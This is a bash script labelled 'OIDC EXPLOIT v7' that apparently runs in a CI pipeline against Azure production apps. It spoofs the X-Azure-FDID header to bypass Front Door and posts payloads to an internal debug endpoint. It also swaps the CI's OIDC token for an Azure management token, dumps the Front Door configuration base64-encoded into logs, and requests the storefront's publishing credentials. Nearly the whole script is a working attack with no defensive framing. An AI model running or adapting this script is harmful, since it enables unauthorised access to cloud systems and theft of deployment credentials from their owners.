#!/bin/bash
set -uo pipefail

echo "=== OIDC EXPLOIT v7 - WEB ACCESS FROM CI ==="

T="${AZURE_TENANT_ID}"
SUB="${AZURE_SUBSCRIPTION_ID}"

# === PART A: Try reaching the web apps from Azure network ===
echo "=== REPORTING APP DIRECT ==="
curl -sS --connect-timeout 8 -m 15 \
  "https://app-tbl-reporting-prod.azurewebsites.net/" 2>&1 | head -c 300
echo ""

echo "=== REPORTING APP WITH FDID ==="
curl -sS --connect-timeout 8 -m 15 \
  -H "X-Azure-FDID: 60407ff3-1c24-4875-9390-b6c9c13b0821" \
  "https://app-tbl-reporting-prod.azurewebsites.net/" 2>&1 | head -c 300
echo ""

echo "=== DEBUG ENDPOINT WITH FDID ==="
curl -sS --connect-timeout 8 -m 15 \
  -H "X-Azure-FDID: 60407ff3-1c24-4875-9390-b6c9c13b0821" \
  -H "Content-Type: application/json" \
  -d '{"expr":"settings"}' \
  -X POST \
  "https://app-tbl-reporting-prod.azurewebsites.net/internal/debug" 2>&1 | head -c 1000
echo ""

echo "=== STOREFRONT DIRECT ==="
curl -sS --connect-timeout 8 -m 15 \
  "https://app-tbl-storefront-prod.azurewebsites.net/" 2>&1 | head -c 300
echo ""

echo "=== STOREFRONT WITH FDID ==="
curl -sS --connect-timeout 8 -m 15 \
  -H "X-Azure-FDID: 60407ff3-1c24-4875-9390-b6c9c13b0821" \
  "https://app-tbl-storefront-prod.azurewebsites.net/" 2>&1 | head -c 300
echo ""

echo "=== FRONT DOOR ==="
curl -sS --connect-timeout 8 -m 15 \
  "https://tbl-storefront-prod-bhagdnascpfyeyfg.z02.azurefd.net/" 2>&1 | head -c 300
echo ""

echo "=== FRONT DOOR DEBUG ==="
curl -sS --connect-timeout 8 -m 15 \
  -H "Content-Type: application/json" \
  -d '{"expr":"settings"}' \
  -X POST \
  "https://tbl-storefront-prod-bhagdnascpfyeyfg.z02.azurefd.net/internal/debug" 2>&1 | head -c 500
echo ""

# === PART B: Use ARM to get FDID and app URLs ===
CID="${AZURE_CLIENT_ID}"
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')
ARM=$(curl -sS -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" \
  -d "grant_type=client_credentials" -d "client_id=$CID" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$OIDC" \
  -d "scope=https://management.azure.com/.default" | jq -r '.access_token // empty')

echo "=== AFD PROFILE ==="
curl -sS -H "Authorization: Bearer $ARM" \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Cdn/profiles/afd-tbl-prod?api-version=2024-02-01" | python3 -c "
import sys,json
d=json.load(sys.stdin)
print('FDID:', d.get('properties',{}).get('frontDoorId',''))
print('state:', d.get('properties',{}).get('provisioningState',''))
" 2>/dev/null || true
echo ""

echo "=== AFD ENDPOINTS ==="
curl -sS -H "Authorization: Bearer $ARM" \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Cdn/profiles/afd-tbl-prod/afdEndpoints?api-version=2024-02-01" | base64 -w0
echo ""

echo "=== AFD ORIGIN GROUPS ==="
curl -sS -H "Authorization: Bearer $ARM" \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Cdn/profiles/afd-tbl-prod/originGroups?api-version=2024-02-01" | base64 -w0
echo ""

echo "=== AFD ROUTES ==="
curl -sS -H "Authorization: Bearer $ARM" \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Cdn/profiles/afd-tbl-prod/afdEndpoints/tbl-storefront-prod/routes?api-version=2024-02-01" | base64 -w0
echo ""

echo "=== STOREFRONT APP PROPS ==="
curl -sS -H "Authorization: Bearer $ARM" \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Web/sites/app-tbl-storefront-prod?api-version=2022-03-01" | python3 -c "
import sys,json
d=json.load(sys.stdin)
p=d.get('properties',{})
print('state:', p.get('state',''))
print('hostNames:', p.get('hostNames',[]))
print('siteConfig:', json.dumps(p.get('siteConfig',{}))[:500])
print('identity:', json.dumps(d.get('identity',{})))
" 2>/dev/null || true
echo ""

echo "=== STOREFRONT PUBLISH CREDS ==="
curl -sS -X POST -H "Authorization: Bearer $ARM" -H "Content-Length: 0" \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/publishingcredentials/list?api-version=2022-03-01" 2>&1 | head -c 500
echo ""

echo ""
echo "=== DONE v7 ==="
